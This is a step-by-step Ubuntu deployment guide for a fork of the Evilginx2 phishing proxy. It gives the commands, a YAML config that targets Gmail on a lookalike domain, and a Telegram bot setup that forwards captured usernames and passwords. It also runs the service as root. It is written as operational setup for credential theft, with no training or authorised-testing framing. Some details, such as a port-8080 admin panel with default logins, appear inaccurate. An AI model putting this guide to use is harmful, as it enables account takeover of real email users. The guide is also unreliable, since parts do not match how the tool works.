# Evilginx2-TTPs Deployment Guide for Ubuntu Server

## Prerequisites

1. Ubuntu Server 20.04 LTS or newer
2. Root or sudo access
3. A domain name pointing to your server's IP address
4. SSL/TLS certificates (Let's Encrypt recommended)
5. Telegram Bot Token and Chat ID for notifications

## 1. System Setup

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y golang git build-essential wget certbot python3-certbot-nginx

# Set up Go environment
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

# Create Evilginx2 directory
mkdir -p /opt/evilginx2
```

## 2. Install Dependencies

```bash
# Install Go dependencies
sudo apt install -y golang-go

# Install Go 1.16 or newer if needed
cd /tmp
wget https://golang.org/dl/go1.16.15.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.16.15.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

## 3. Clone and Build Evilginx2

```bash
# Clone repository
cd /opt/evilginx2
git clone https://github.com/aalex954/evilginx2-TTPs.git .

# Build Evilginx2
go build -o evilginx2
```

## 4. Configure SSL/TLS

```bash
# Install Certbot
sudo apt install -y certbot python3-certbot-nginx

# Obtain SSL certificate
sudo certbot certonly --standalone -d your-domain.com
```

## 5. Configure Evilginx2

Create `/opt/evilginx2/config.yaml`:

```yaml
server:
  ip: "0.0.0.0"

site_domains:
  gmail: "mail.your-domain.com"
  # Add other sites as needed

sites_enabled:
  gmail: true
  # Enable other sites as needed

sites_hidden:
  gmail: false
  # Set to true to hide from management interface

proxy_enabled: false

telegram:
  enabled: true
  bot_token: "YOUR_TELEGRAM_BOT_TOKEN"
  chat_id: "YOUR_TELEGRAM_CHAT_ID"
```

## 6. Set Up Systemd Service

Create `/etc/systemd/system/evilginx2.service`:

```ini
[Unit]
Description=Evilginx2 Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx2
ExecStart=/opt/evilginx2/evilginx2
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

## 7. Configure Firewall

```bash
# Allow HTTP/HTTPS
sudo ufw allow 'Nginx Full'

# Allow DNS
sudo ufw allow 53/tcp
sudo ufw allow 53/udp

# Enable firewall
sudo ufw enable
```

## 8. Start and Enable Service

```bash
# Reload systemd
sudo systemctl daemon-reload

# Start Evilginx2
sudo systemctl start evilginx2

# Enable to start on boot
sudo systemctl enable evilginx2

# Check status
sudo systemctl status evilginx2
```

## 9. Verify Installation

1. Access Evilginx2 management interface at: https://your-domain.com:8080
2. Default credentials: admin/evilginx
3. Verify Telegram notifications by testing with a known username/password

## Security Recommendations

1. Change default admin password immediately
2. Enable fail2ban for additional security
3. Keep system and Evilginx2 updated
4. Regularly back up configuration files
5. Monitor system logs for suspicious activity

## Troubleshooting

1. Check Evilginx2 logs:
```bash
journalctl -u evilginx2 -f
```

2. Verify SSL certificates:
```bash
sudo certbot certificates
```

3. Check if port 8080 is open:
```bash
sudo netstat -tulpn | grep 8080
```

## Maintenance

1. Update certificates:
```bash
sudo certbot renew
```

2. Update Evilginx2:
```bash
cd /opt/evilginx2
git pull
make build
sudo systemctl restart evilginx2
```
